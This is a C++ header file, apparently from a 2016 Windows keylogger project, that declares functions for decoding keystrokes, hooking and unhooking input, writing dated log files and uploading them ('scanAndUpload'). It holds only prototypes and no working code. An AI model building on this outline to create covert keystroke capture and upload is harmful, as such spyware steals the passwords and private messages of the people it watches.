/*
 * klgr.h
 *
 *  Created on: Nov 17, 2016
 *      Author: Kishore
 */

#ifndef KLGR_H_
#define KLGR_H_


void TerminateProgram(void);
void InitializeLogFile();
void writeToFile(std::string content);
void unHook();
void buildData(std::string,std::string);
void isLogFileCurrent();


int compareDates(std::string,std::string);
std::string decodeKeys(DWORD,bool,bool,bool,bool);
std::string getStringDateTime(std::string info);
void MakeDir(const std::string& dirPath);
time_t timeNow();
bool scanAndUpload(char[]);

#endif /* KLGR_H_ */
